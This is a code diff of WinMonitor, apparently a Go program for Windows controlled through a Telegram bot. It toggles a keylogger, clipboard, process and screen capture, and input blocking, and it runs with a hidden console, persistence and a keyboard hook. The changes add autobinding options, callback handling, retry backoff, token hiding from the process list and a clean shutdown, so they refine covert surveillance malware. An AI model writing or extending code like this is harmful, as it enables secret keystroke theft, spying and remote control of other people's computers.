 	case "activity_monitor":
-		cfgUpdate(func(c *Config) { c.ActivityMonitor = parseBool(val) })
+		setBool(func(c *Config, b bool) { c.ActivityMonitor = b })
 	case "process_monitor":
-		cfgUpdate(func(c *Config) { c.ProcessMonitor = parseBool(val) })
+		setBool(func(c *Config, b bool) { c.ProcessMonitor = b })
 	case "clipboard_monitor":
-		cfgUpdate(func(c *Config) { c.ClipboardMonitor = parseBool(val) })
+		setBool(func(c *Config, b bool) { c.ClipboardMonitor = b })
 	case "keylogger":
-		cfgUpdate(func(c *Config) { c.Keylogger = parseBool(val) })
+		setBool(func(c *Config, b bool) { c.Keylogger = b })
 	case "keylog_flush":
-		v, err := strconv.Atoi(val)
-		if err != nil {
-			return false
-		}
-		cfgUpdate(func(c *Config) { c.KeylogFlush = v })
+		return setInt(func(c *Config, v int) { c.KeylogFlush = v })
 	case "block_safety_minutes":
-		v, err := strconv.Atoi(val)
-		if err != nil {
-			return false
-		}
-		cfgUpdate(func(c *Config) { c.BlockSafetyMinutes = v })
+		return setInt(func(c *Config, v int) { c.BlockSafetyMinutes = v })
 	case "heartbeat_interval":
-		v, err := strconv.Atoi(val)
-		if err != nil {
-			return false
-		}
-		cfgUpdate(func(c *Config) { c.HeartbeatInterval = v })
+		return setInt(func(c *Config, v int) { c.HeartbeatInterval = v })
+	case "allow_autobind":
+		setBool(func(c *Config, b bool) { c.AllowAutoBind = b })
 	default:
-		return false
+		return "Khóa không hợp lệ. Khóa hợp lệ: screenshot_interval, screenshots_enabled, activity_monitor, process_monitor, clipboard_monitor, keylogger, keylog_flush, block_safety_minutes, heartbeat_interval, allow_autobind"
 	}
-	return true
+	return ""
 }
 
 func onoff(b bool) string {
@@ -974,11 +1293,13 @@ func maskToken(t string) string {
 }
 
 // ---- Update dispatch ----
-var botUsername string
-
 func isAuthorized(chatID string) bool {
 	cid := strings.TrimSpace(cfgGet().ChatID)
 	if cid == "" || strings.Contains(cid, "PUT_YOUR") {
+		if !cfgGet().AllowAutoBind {
+			logMsg("Từ chối chat lạ (allow_autobind=false): " + chatID)
+			return false
+		}
 		cfgUpdate(func(c *Config) { c.ChatID = chatID })
 		notify("✅ Đã liên kết chat này (<code>" + chatID + "</code>) làm chủ.\nGửi /help để bắt đầu.")
 		return true
@@ -987,6 +1308,22 @@ func isAuthorized(chatID string) bool {
 }
 
 func handleUpdate(upd map[string]interface{}) {
+	// Callback từ inline keyboard (issue #38)
+	if cb, ok := upd["callback_query"].(map[string]interface{}); ok {
+		id, _ := cb["id"].(string)
+		data, _ := cb["data"].(string)
+		fromChat := ""
+		if msg, ok := cb["message"].(map[string]interface{}); ok {
+			if chat, ok := msg["chat"].(map[string]interface{}); ok {
+				fromChat = chatIDOf(chat)
+			}
+		}
+		tgCall("answerCallbackQuery", map[string]string{"callback_query_id": id}, "", "")
+		if fromChat != "" && isAuthorized(fromChat) && strings.HasPrefix(data, "/") {
+			handleCommand(data, fromChat)
+		}
+		return
+	}
 	msg, _ := upd["message"].(map[string]interface{})
 	if msg == nil {
 		msg, _ = upd["edited_message"].(map[string]interface{})
@@ -998,15 +1335,7 @@ func handleUpdate(upd map[string]interface{}) {
 	if chat == nil {
 		return
 	}
-	var chatID string
-	switch v := chat["id"].(type) {
-	case float64:
-		chatID = strconv.FormatInt(int64(v), 10)
-	case json.Number:
-		chatID = v.String()
-	case string:
-		chatID = v
-	}
+	chatID := chatIDOf(chat)
 	if chatID == "" {
 		return
 	}
@@ -1016,6 +1345,18 @@ func handleUpdate(upd map[string]interface{}) {
 		return
 	}
 	handleCommand(text, chatID)
+}
+
+func chatIDOf(chat map[string]interface{}) string {
+	switch v := chat["id"].(type) {
+	case float64:
+		return strconv.FormatInt(int64(v), 10)
+	case json.Number:
+		return v.String()
+	case string:
+		return v
+	}
+	return ""
 }
 
 // ---- Heartbeat ----
@@ -1036,17 +1377,28 @@ func heartbeatLoop() {
 // ---- Polling ----
 func pollLoop() {
 	offset := 0
+	backoff := time.Second
 	for isRunning() {
 		params := map[string]string{
 			"offset":          strconv.Itoa(offset),
 			"timeout":         "25",
-			"allowed_updates": `["message"]`,
+			"allowed_updates": `["message","callback_query"]`,
 		}
 		res := tgCall("getUpdates", params, "", "")
 		if ok, _ := res["ok"].(bool); !ok {
-			time.Sleep(3 * time.Second)
+			// 409 = token dùng ở nơi khác (issue #13)
+			if ec, _ := res["error_code"].(float64); int(ec) == 409 {
+				logMsg("409 Conflict: bot token đang được dùng ở nơi khác (máy/tiến trình khác).")
+				time.Sleep(10 * time.Second)
+				continue
+			}
+			time.Sleep(backoff)
+			if backoff < 30*time.Second {
+				backoff *= 2
+			}
 			continue
 		}
+		backoff = time.Second
 		result, _ := res["result"].([]interface{})
 		for _, u := range result {
 			upd, _ := u.(map[string]interface{})
@@ -1075,12 +1427,28 @@ func argValue(name string) string {
 	return ""
 }
 
+// scrubArgs che token trong os.Args để không lộ qua process list (issue #2).
+func scrubArgs() {
+	for i := 0; i < len(os.Args); i++ {
+		if os.Args[i] == "--token" && i+1 < len(os.Args) {
+			os.Args[i+1] = "***"
+		} else if strings.HasPrefix(os.Args[i], "--token=") {
+			os.Args[i] = "--token=***"
+		}
+	}
+}
+
 func applyCLIConfig() {
+	// Token ưu tiên biến môi trường WINMON_TOKEN (kín hơn --token)
+	if tok := os.Getenv("WINMON_TOKEN"); tok != "" {
+		cfgUpdate(func(c *Config) { c.BotToken = tok })
+	}
 	if cfgFile := argValue("--config"); cfgFile != "" && fileExists(cfgFile) {
 		if data, err := os.ReadFile(cfgFile); err == nil {
-			var c Config
-			if json.Unmarshal(data, &c) == nil {
-				mergeConfig(&c)
+			if c, ok := applyConfigData(cfgGet(), data); ok {
+				cfgMu.Lock()
+				cfg = c
+				cfgMu.Unlock()
 				saveConfig()
 			}
 		}
@@ -1091,27 +1459,48 @@ func applyCLIConfig() {
 	if chat := argValue("--chat"); chat != "" {
 		cfgUpdate(func(c *Config) { c.ChatID = chat })
 	}
+	scrubArgs()
 }
 
 func main() {
 	os.MkdirAll(baseDir, 0o755)
+	setDpiAwareness()
 	hideConsole()
 	loadConfig()
 	applyCLIConfig()
 
 	token := cfgGet().BotToken
 	if token == "" || strings.Contains(token, "PUT_YOUR") {
-		logMsg("Chua cau hinh bot_token. Dung.")
+		logMsg("Chưa cấu hình bot_token. Dừng.")
 		return
 	}
 	if !acquireSingleInstance() {
-		logMsg("Da co 1 ban WinMonitor dang chay. Thoat.")
+		logMsg("Đã có 1 bản WinMonitor đang chạy. Thoát.")
 		return
 	}
 
-	AutoUnblockNotify = func() { notify("🔓 Đã tự KẾT NỐI LẠI bàn phím & chuột.") }
+	// Kiểm tra token hợp lệ (issue #9) — chỉ thoát nếu token SAI, không thoát khi offline
+	if me := tgCall("getMe", map[string]string{}, "", ""); func() bool {
+		if ok, _ := me["ok"].(bool); ok {
+			return false
+		}
+		if ec, _ := me["error_code"].(float64); int(ec) == 401 {
+			return true // token sai
+		}
+		return false // lỗi mạng -> tiếp tục
+	}() {
+		logMsg("bot_token không hợp lệ (401). Dừng.")
+		return
+	} else if ok, _ := me["ok"].(bool); !ok {
+		logMsg("Cảnh báo: không kết nối được Telegram lúc khởi động (sẽ thử lại).")
+	}
+
+	AutoUnblockNotify = func() { notify("🔓 Đã tự KẾT NỐI LẠI bàn phím & chuột (hết thời hạn an toàn).") }
+
+	hookOK = startKeyboardHook(keySink)
 
 	ensurePersistence()
+	cleanupOldShots(2 * time.Hour)
 
 	go senderLoop()
 	go registerBotCommands()
@@ -1126,5 +1515,16 @@ func main() {
 	logMsg("WinMonitor started.")
 	notify("✅ <b>WinMonitor đã khởi động</b> trên máy này.\nGửi /help để xem lệnh.")
 
-	pollLoop()
+	go pollLoop()
+
+	// Chờ tín hiệu thoát (issue #29): giải phóng BlockInput rồi thoát êm
+	sig := make(chan os.Signal, 1)
+	signal.Notify(sig, os.Interrupt, syscall.SIGTERM)
+	select {
+	case <-stopMain:
+	case <-sig:
+	}
+	StopBlock()
+	time.Sleep(300 * time.Millisecond)
+	os.Exit(0)
 }
